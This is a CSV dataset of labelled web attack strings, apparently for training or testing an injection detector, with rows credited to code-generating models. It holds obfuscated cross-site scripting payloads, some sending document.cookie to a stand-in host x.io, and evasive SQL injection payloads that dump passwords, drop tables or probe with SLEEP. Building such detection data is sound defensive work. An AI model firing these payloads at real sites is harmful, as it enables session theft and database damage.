text,label,attack_type,generator
%2522%253E%253Cdetails%2520onerror%253Dconfirm%25281%2529%253E,1,xss,codellama
%2522%2526gt%253B%2526lt%253Bmarquee%2520onfocus%253Dconfirm%25281%2529%2526gt%253B,1,xss,codellama
"<A OnToGgLe=""CoNfIrM(1)"">",1,xss,codellama
'><BoDy oNiNpUt=aLeRt(1)>,1,xss,codellama
%253Cmarquee%2520onload%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
%253Cscript%2520onmouseover%253D%2522print%2528%2529%2522%253E,1,xss,codellama
%2522%253E%253Csvg%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
<A OnClIcK=AlErT(DoCuMeNt.dOmAiN)>,1,xss,codellama
%2522%253E%253Ca%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
%2527%253E%253cMaRqUeE%2520OnClIcK%253dEvAl%2528aToB%2528%2527yWxLcNqOmSk%2527%2529%2529%253e,1,xss,codellama
%2527%253E%253cIfRaMe%2520oNtOgGlE%253dAlErT%2528DoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
%2527%253E%253Cbody%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
<A OnPoInTeRoVeR=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,codellama
%253Cmarquee%2520onfocus%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
%253Cinput%2520oninput%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%253Ca%2520oninput%253D%2522alert%25281%2529%2522%253E,1,xss,codellama
%2522%253E%253Cimg%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%253cSvG%2520OnFoCuS%253d%2522aLeRt%25281%2529%2522%253E,1,xss,codellama
"""&gt;&lt;img oninput=alert(document.domain)&gt;",1,xss,codellama
%253Ciframe%2520onmouseover%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
%2527%253E%253Cdiv%2520onanimationstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2527%253E%253Cscript%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
"&lt;input onstart=""alert(document.cookie)""&gt;",1,xss,codellama
%2522%253E%253Ca%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
'><DiV OnLoAd=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,codellama
%253Cmarquee%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
<InPuT OnErRoR=AlErT(1)>,1,xss,codellama
%253Cbody%2520onanimationstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
'><ObJeCt oNeRrOr=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
%2522%253E%253Cdiv%2520onstart%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
"""&gt;&lt;svg onpointerover=location='//x.io'&gt;",1,xss,codellama
%2527%253E%253Cimg%2520onpointerover%253Dalert%25281%2529%253E,1,xss,codellama
%253cImG%2520OnClIcK%253dPrInT%2528%2529%253e,1,xss,codellama
%2527%253E%253Cmarquee%2520onpointerover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
"""><MaRqUeE OnToGgLe=aLeRt(dOcUmEnT.CoOkIe)>",1,xss,codellama
%2522%253E%253Cvideo%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%253Caudio%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
%253Caudio%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%253Ciframe%2520src%253D%2522JaVaScRiPt%253Aalert%2528document.cookie%2529%2522%253E,1,xss,codellama
%253Cdiv%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
"""&gt;&lt;audio onmouseover=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,codellama
%2522%253E%253Cdiv%2520onclick%253Dalert%25281%2529%253E,1,xss,codellama
%2527%253E%253Cdetails%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%253Ca%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%253Csvg%2520ontoggle%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
%253Cobject%2520onanimationstart%253Dalert%25281%2529%253E,1,xss,codellama
%253Cmarquee%2520onanimationstart%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%2522%253E%253Cdiv%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
'><BoDy oNpOiNtErOvEr=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,codellama
'&gt;&lt;img onclick=alert(1)&gt;,1,xss,codellama
%2522%253E%253Cimg%2520onpointerover%253Dprint%2528%2529%253E,1,xss,codellama
%253Cobject%2520onerror%253Dprint%2528%2529%253E,1,xss,codellama
%2527%253E%253CViDeO%2520OnLoAd%253DeVaL%2528AtOb%2528%2527YwXlCnQoMsK%2527%2529%2529%253E,1,xss,codellama
"""&gt;&lt;body onpointerover=confirm(1)&gt;",1,xss,codellama
"""&gt;&lt;object onanimationstart=alert(document.cookie)&gt;",1,xss,codellama
%2522%253E%253Cdiv%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
"<A OnInPuT=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
%253Cscript%2520onstart%253D%2522print%2528%2529%2522%253E,1,xss,codellama
%2527%253E%253Cinput%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%2522%253E%253Ca%2520onstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"<ObJeCt oNeRrOr=""FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)"">",1,xss,codellama
"""><A OnPoInTeRoVeR=LoCaTiOn='//X.Io'>",1,xss,codellama
%2522%253E%253Ciframe%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%2527%2526gt%253B%2526lt%253Binput%2520onerror%253Dprint%2528%2529%2526gt%253B,1,xss,codellama
%2522%253E%253Cbody%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"<a href=""javasCrIpT:print()"">x</a>",1,xss,codellama
"<AuDiO OnFoCuS=""aLeRt(1)"">",1,xss,codellama
%2522%253E%253Cscript%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%253Cdetails%2520onerror%253Dalert%25281%2529%253E,1,xss,codellama
%253Cbody%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
<ImG OnToGgLe=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
"""><A OnErRoR=CoNfIrM(1)>",1,xss,codellama
<ScRiPt oNmOuSeOvEr=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
%2522%253E%253Cdiv%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
"""&gt;&lt;svg onfocus=fetch('//x.io/'+document.cookie)&gt;",1,xss,codellama
%2527%253E%253Cdiv%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
%2522%253E%253Ca%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
"""><BoDy oNiNpUt=aLeRt(1)>",1,xss,codellama
%253Cbody%2520ontoggle%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
%2527%253E%253Ca%2520oninput%253Dprint%2528%2529%253E,1,xss,codellama
%2527%253E%253Cvideo%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253Cinput%2520ontoggle%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
"<DiV OnPoInTeRoVeR=""pRiNt()"">",1,xss,codellama
"""><ScRiPt oNmOuSeOvEr=aLeRt(dOcUmEnT.DoMaIn)>",1,xss,codellama
%253Cimg%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"""><A OnClIcK=LoCaTiOn='//X.Io'>",1,xss,codellama
"""><SvG OnStArT=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,codellama
%2527%253E%253Cobject%2520onfocus%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%2527%253E%253Cmarquee%2520onmouseover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253Cbody%2520onfocus%253D%2522print%2528%2529%2522%253E,1,xss,codellama
"<AuDiO OnToGgLe=""EvAl(aToB('yWxLcNqOmSk'))"">",1,xss,codellama
%253Cvideo%2520onanimationstart%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%2527%253E%253CDeTaIlS%2520OnAnImAtIoNsTaRt%253DaLeRt%2528dOcUmEnT.CoOkIe%2529%253E,1,xss,codellama
%2522%253E%253Cobject%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%253Ciframe%2520onerror%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%2522%253E%253Cvideo%2520onerror%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%253Cmarquee%2520onclick%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
<BoDy oNcLiCk=cOnFiRm(1)>,1,xss,codellama
<A OnMoUsEoVeR=AlErT(DoCuMeNt.dOmAiN)>,1,xss,codellama
%2522%253E%253Cobject%2520onload%253Dalert%25281%2529%253E,1,xss,codellama
%253Cbody%2520onmouseover%253Dalert%25281%2529%253E,1,xss,codellama
%2527%253E%253CIfRaMe%2520oNtOgGlE%253DAlErT%25281%2529%253E,1,xss,codellama
%2527%253E%253Cdetails%2520onfocus%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%2527%253E%253Cmarquee%2520onload%253Dprint%2528%2529%253E,1,xss,codellama
%253Cvideo%2520onanimationstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
%2522%253E%253Cdetails%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%2527%253E%253Cvideo%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%2527%253E%253Ca%2520oninput%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
%253Cinput%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
&lt;object onclick=alert(document.cookie)&gt;,1,xss,codellama
"""><ObJeCt oNaNiMaTiOnStArT=PrInT()>",1,xss,codellama
%253CInPuT%2520OnAnImAtIoNsTaRt%253D%2522AlErT%2528DoCuMeNt.dOmAiN%2529%2522%253E,1,xss,codellama
%2522%253E%253Cvideo%2520onanimationstart%253Dconfirm%25281%2529%253E,1,xss,codellama
%253Caudio%2520onload%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%2527%253E%253Cdiv%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
<DeTaIlS OnAnImAtIoNsTaRt=aLeRt(1)>,1,xss,codellama
%2527%253E%253Ca%2520onload%253Dconfirm%25281%2529%253E,1,xss,codellama
%2527%253E%253Cinput%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"&lt;div oninput=""confirm(1)""&gt;",1,xss,codellama
<MaRqUeE OnInPuT=AlErT(DoCuMeNt.cOoKiE)>,1,xss,codellama
%2527%253E%253Csvg%2520onpointerover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%253Ciframe%2520onanimationstart%253Dconfirm%25281%2529%253E,1,xss,codellama
%2527%2529%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%2520%2528S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520COUNT%2528%252A%2529%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520sessions%2529%253E0%2523,1,sqli,deepseek-r1
']; dRoP TaBlE AdMiN-- -,1,sqli,deepseek-r1
')%09AnD%091 BeTwEeN 0 AnD 9%09#,1,sqli,deepseek-r1
%2527%2529%252f%252A%252a%252FaNd%252F%252a%252A%252f%2527a%2527%253d%2527a%2527%252f%252A%252a%252F--%2520-,1,sqli,deepseek-r1
"'/**/UNION/**/SELECT/**/token,pwd,first_name,name,user,uid/**/FROM/**/admin--",1,sqli,deepseek-r1
')%0aUnIoN%0aSeLeCt%0aiD%0aFrOm%0acUsToMeRs--,1,sqli,deepseek-r1
'%0aOR%0a'a'='a'%0a--%0a-,1,sqli,deepseek-r1
%2522%2529%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%2520%2528S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520COUNT%2528%252A%2529%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520accounts%2529%253E0%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2560%252509OR%2525091%253D2%252509--%2520-,1,sqli,deepseek-r1
%2527%2509A/**/N/**/D%25091%2520BETWEEN%25200%2520A/**/N/**/D%25209%2509%2523,1,sqli,deepseek-r1
""")%09O/**/r%09'A'='A'%09/*x*/",1,sqli,deepseek-r1
""") UnIoN SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL,NuLl%23",1,sqli,deepseek-r1
%2527%2520UNION%2520SELECT%2520username%252Crole%2520FROM%2520tokens%252523,1,sqli,deepseek-r1
""")/**/OR/**/1%09LIKE%091/**//*x*/",1,sqli,deepseek-r1
%2560%25250aAND%25250a0%253C1%25250a%2523,1,sqli,deepseek-r1
')%0aOr%0A''=''%0A-- -,1,sqli,deepseek-r1
%2527%253B%2520DROP%2520TABLE%2520staff--,1,sqli,deepseek-r1
"""%0AaNd%0A1 bEtWeEn 0 aNd 9%0A-- ",1,sqli,deepseek-r1
%2560%253B%2520DROP%2520TABLE%2520orders--%2520,1,sqli,deepseek-r1
%2522%2529%252BO%252F%252A%252A%252FR%252B%2527%2527%253D%2527%2527%252B%2523,1,sqli,deepseek-r1
`	oR	1=2	/*X*/,1,sqli,deepseek-r1
%2560%2509AND%25091%2520LIKE%25201%2509--,1,sqli,deepseek-r1
%2527%2529%253B%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520S%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FE%252F%252A%252A%252FP%25285%2529%2523,1,sqli,deepseek-r1
') O/**/R 0<1 /*x*/,1,sqli,deepseek-r1
%2522%2529%252F%252A%252A%252FA%252F%252A%252A%252FN%252F%252A%252A%252FD%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--%2520,1,sqli,deepseek-r1
%2527%252BAND%252B1%2520LIKE%25201%252B--,1,sqli,deepseek-r1
%2527%2529%25250d%25250aOR%25250d%25250a%2527a%2527%253D%2527a%2527%25250d%25250a%252523,1,sqli,deepseek-r1
%2522%252BA/**/N/**/D%252B1%2520LIKE%25201%252B%252523,1,sqli,deepseek-r1
%2527%25250d%25250aOR%25250d%25250a1%253D1%25250d%25250a%2523,1,sqli,deepseek-r1
"""%0aA/**/N/**/D%0a1 BETWEEN 0 A/**/N/**/D 9%0a/*x*/",1,sqli,deepseek-r1
%2522%2529%253B%2520D/**/R/**/O/**/P%2520TABLE%2520o/**/rders--%2520,1,sqli,deepseek-r1
%2522%2529%252BOR%252B%2527%2527%253D%2527%2527%252B%252523,1,sqli,deepseek-r1
%2527%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%2520%2528S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520COUNT%2528%252A%2529%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520members%2529%253E0--,1,sqli,deepseek-r1
`%0Ao/**/R%0a0<1%0a-- ,1,sqli,deepseek-r1
') U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL-- -,1,sqli,deepseek-r1
']	A/**/N/**/D	1/**/BETWEEN/**/0/**/A/**/N/**/D/**/9	/*x*/,1,sqli,deepseek-r1
%2527%255D%2520A/**/N/**/D%2520%2528S/**/E/**/L/**/E/**/C/**/T%2520COUNT%2528%252A%2529%2520F/**/R/**/O/**/M%2520sessions%2529%253E0--,1,sqli,deepseek-r1
%2522%2529%2509A%252F%252A%252A%252FN%252F%252A%252A%252FD%25091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%2509--%2520-,1,sqli,deepseek-r1
%2560%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520orders%2529%253E0%252523,1,sqli,deepseek-r1
"' U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL,NULL,NULL,NULL,NULL#",1,sqli,deepseek-r1
""")	O/**/R	1/**/LIKE/**/1	--/**/",1,sqli,deepseek-r1
%2527%2520UNION%2520SELECT%2520email%252Clast_name%252Cname%252Cpassword%2520FROM%2520customers%252523,1,sqli,deepseek-r1
%2522%2529%253B%2520DROP%2520TABLE%2520users--%2520-,1,sqli,deepseek-r1
""")%0d%0aA/**/N/**/D%0d%0a0<1%0d%0a--",1,sqli,deepseek-r1
%2527%2529%253b%2520dRoP%2520TaBlE%2520AdMiN--%2520,1,sqli,deepseek-r1
`%09OR%091/**/LIKE/**/1%09--/**/-,1,sqli,deepseek-r1
'%09AND%091+BETWEEN+0+AND+9%09#,1,sqli,deepseek-r1
%2527%255D%25250d%25250aO/**/R%25250d%25250a1%2520LIKE%25201%25250d%25250a--%2520-,1,sqli,deepseek-r1
%2522%25250aOR%25250a1%253D2%25250a--,1,sqli,deepseek-r1
')/**/A/**/N/**/D/**/(S/**/E/**/L/**/E/**/C/**/T/**/COUNT(*)/**/F/**/R/**/O/**/M/**/sessions)>0/*x*/,1,sqli,deepseek-r1
""")%0aOr%0A2>1%0A%23",1,sqli,deepseek-r1
%2527%255D%2509AND%2509%2527a%2527%253D%2527a%2527%2509%252523,1,sqli,deepseek-r1
%2522%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520users%2529%253E0--,1,sqli,deepseek-r1
%2527%2529%252BA/**/N/**/D%252B1%253D2%252B--%2520-,1,sqli,deepseek-r1
""")+AnD+(sElEcT+CoUnT(*)+fRoM+UsErS)>0%23",1,sqli,deepseek-r1
"""%0aoR%0a2>1%0a%23",1,sqli,deepseek-r1
%2522%25250aO%252F%252A%252A%252FR%25250a1%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%25250a--%2520,1,sqli,deepseek-r1
""")+A/**/N/**/D+1 LIKE 1+-- -",1,sqli,deepseek-r1
""")/**/a/**/N/**/d/**/1=1/**//*x*/",1,sqli,deepseek-r1
%2522%2529%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL%252CNULL%252CNULL%2523,1,sqli,deepseek-r1
`	aNd	2>1	--+-,1,sqli,deepseek-r1
%2527%255D%2509OR%2509%2527%2527%253D%2527%2527%2509--%2520,1,sqli,deepseek-r1
']%0d%0aA/**/N/**/D%0d%0a1 LIKE 1%0d%0a#,1,sqli,deepseek-r1
%2560%252F%252A%252A%252FO%252F%252A%252A%252FR%252F%252A%252A%252F1%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%252F%252A%252A%252F%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2560%25250d%25250aO%252F%252A%252A%252FR%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--%2520,1,sqli,deepseek-r1
%2560%252F%252A%252A%252FOr%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2522%2529%25250d%25250aAND%25250d%25250a1%2520BETWEEN%25200%2520AND%25209%25250d%25250a%252523,1,sqli,deepseek-r1
`%09OR%091=1%09--%09-,1,sqli,deepseek-r1
'	oR	2>1	%23,1,sqli,deepseek-r1
%2522%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520tokens%2529%253E0%252F%252Ax%252A%252F,1,sqli,deepseek-r1
']%0aU/**/N/**/I/**/O/**/N%0aS/**/E/**/L/**/E/**/C/**/T%0aid%0aF/**/R/**/O/**/M%0acustomers%23,1,sqli,deepseek-r1
`%0Aa/**/N/**/d%0A0<1%0A%23,1,sqli,deepseek-r1
"""%09oR%091=2%09/*X*/",1,sqli,deepseek-r1
'/**/O/**/R/**/1 BETWEEN 0 A/**/N/**/D 9/**/-- ,1,sqli,deepseek-r1
')%0d%0aOR%0d%0a1=2%0d%0a--%0a-,1,sqli,deepseek-r1
%2560%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%2520%2528S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520COUNT%2528%252A%2529%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520sessions%2529%253E0--,1,sqli,deepseek-r1
""")	Or	1=1	#",1,sqli,deepseek-r1
%2522%2529%253B%2520D%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FP%2520TABLE%2520staff--,1,sqli,deepseek-r1
%2527%252F%252A%252A%252FAND%252F%252A%252A%252F2%253E1%252F%252A%252A%252F%2523,1,sqli,deepseek-r1
""") AnD 0<1 /*X*/",1,sqli,deepseek-r1
')%09AnD%092>1%09--,1,sqli,deepseek-r1
`	a/**/N/**/d	1 bEtWeEn 0 a/**/N/**/d 9	/*x*/,1,sqli,deepseek-r1
"""/**/Or/**/1 LiKe 1/**/--",1,sqli,deepseek-r1
%2560%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D2%252F%252A%252A%252F%2523,1,sqli,deepseek-r1
%2527%2529%2520OR%25201%253D1%2520%2523,1,sqli,deepseek-r1
%2527%255D%2520AND%2520%2527%2527%253D%2527%2527%2520%2523,1,sqli,deepseek-r1
%2527%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252A%2529%2520FrOm%2520sTaFf%2529%253E0%252523,1,sqli,deepseek-r1
']	O/**/R	2>1	#,1,sqli,deepseek-r1
"""+oR+1=2+-- ",1,sqli,deepseek-r1
'] A/**/N/**/D 1 LIKE 1 #,1,sqli,deepseek-r1
"` U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T last_name,id,role,status F/**/R/**/O/**/M sessions-- -",1,sqli,deepseek-r1
"""%0d%0aA/**/N/**/D%0d%0a1=1%0d%0a/*x*/",1,sqli,deepseek-r1
"""%0D%0aOr%0D%0a''=''%0d%0A%23",1,sqli,deepseek-r1
"""; DrOp tAbLe sEsSiOnS#",1,sqli,deepseek-r1
' a/**/N/**/d 1=1 /*x*/,1,sqli,deepseek-r1
""" oR ''='' #",1,sqli,deepseek-r1
`;%09DROP%09TABLE%09admin%23,1,sqli,deepseek-r1
"""/**/UNION/**/SELECT/**/id,uid/**/FROM/**/members%23",1,sqli,deepseek-r1
""")	Or	1=2	--",1,sqli,deepseek-r1
`/**/AnD/**/'A'='A'/**//*X*/,1,sqli,deepseek-r1
""")	AND	2>1	--+",1,sqli,deepseek-r1
%2560%2520AND%2520%2527a%2527%253D%2527a%2527%2520%252523,1,sqli,deepseek-r1
""")%09O/**/R%091 LIKE 1%09/*x*/",1,sqli,deepseek-r1
`%0AaNd%0A(SeLeCt%0AcOuNt(*)%0aFrOm%0AcReDeNtIaLs)>0/*x*/,1,sqli,deepseek-r1
"""; D/**/R/**/O/**/P TABLE admin/*x*/",1,sqli,deepseek-r1
""") Or (SeLeCt uSeR FrOm tOkEnS WhErE UsEr=618)=610",1,sqli,deepseek-r1
%2527%2509oR%25092%253E1%2509%2523,1,sqli,deepseek-r1
`%0aU/**/N/**/I/**/O/**/N%0aS/**/E/**/L/**/E/**/C/**/T%0aNULL/*x*/,1,sqli,deepseek-r1
'	OR	'a'='a'	--%09-,1,sqli,deepseek-r1
"""	oR	''=''	--%09",1,sqli,deepseek-r1
"""%09A/**/N/**/D%091+BETWEEN+0+A/**/N/**/D+9%09--+",1,sqli,deepseek-r1
%2527%2529%2509Or%25091%2520bEtWeEn%25200%2520aNd%25209%2509--%2520,1,sqli,deepseek-r1
%2560%252BoR%252b1%253d1%252b%252F%252aX%252a%252F,1,sqli,deepseek-r1
"') U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T name,account,email F/**/R/**/O/**/M o/**/rders#",1,sqli,deepseek-r1
'	aNd	0<1	#,1,sqli,deepseek-r1
%2522%2529%2509Or%25092%253E1%2509%252523,1,sqli,deepseek-r1
%2522%2529%252F%252A%252A%252FO%252F%252A%252A%252FR%252F%252A%252A%252F0%253C1%252F%252A%252A%252F--,1,sqli,deepseek-r1
"""%09O/**/R%092>1%09-- ",1,sqli,deepseek-r1
'%09AND%091=1%09--%09,1,sqli,deepseek-r1
`/**/OR/**/1%09LIKE%091/**/%23,1,sqli,deepseek-r1
%2522%2529%25250aOR%25250a2%253E1%25250a--%2520-,1,sqli,deepseek-r1
`;%09SELECT%09SLEEP(5)/*x*/,1,sqli,deepseek-r1
']/**/aNd/**/''=''/**/#,1,sqli,deepseek-r1
"') A/**/n/**/D ExTrAcTvAlUe(1,cOnCaT(0x7e,(S/**/e/**/L/**/e/**/C/**/t pAsSwO/**/rD F/**/r/**/O/**/m cUsToMeRs lImIt 1)))",1,sqli,deepseek-r1
"""/**/O/**/R/**/1=1/**/--+-",1,sqli,deepseek-r1
%2527%2529%2520AnD%25201%2520BeTwEeN%25200%2520AnD%25209%2520%252523,1,sqli,deepseek-r1
""") A/**/N/**/D extractvalue(1,concat(0x7e,(S/**/E/**/L/**/E/**/C/**/T user F/**/R/**/O/**/M staff LIMIT 1)))",1,sqli,deepseek-r1
') Or 1=1 lImIt 1-- ,1,sqli,deepseek-r1
""")/**/oR/**/'A'='A'/**/%23",1,sqli,deepseek-r1
%2527%252BOR%252B1%252509LIKE%2525091%252B%252F%252Ax%252A%252F,1,sqli,deepseek-r1
"""+OR+''=''+--%09-",1,sqli,deepseek-r1
""")+OR+(SELECT+name+FROM+orders+WHERE+name=841)=906",1,sqli,deepseek-r1
']/**/oR/**/(SeLeCt/**/ToKeN/**/fRoM/**/cReDeNtIaLs/**/WhErE/**/tOkEn=136)=953,1,sqli,deepseek-r1
']%0aA/**/N/**/D%0a1=2%0a-- ,1,sqli,deepseek-r1
"""+a/**/N/**/d+''=''+-- ",1,sqli,deepseek-r1
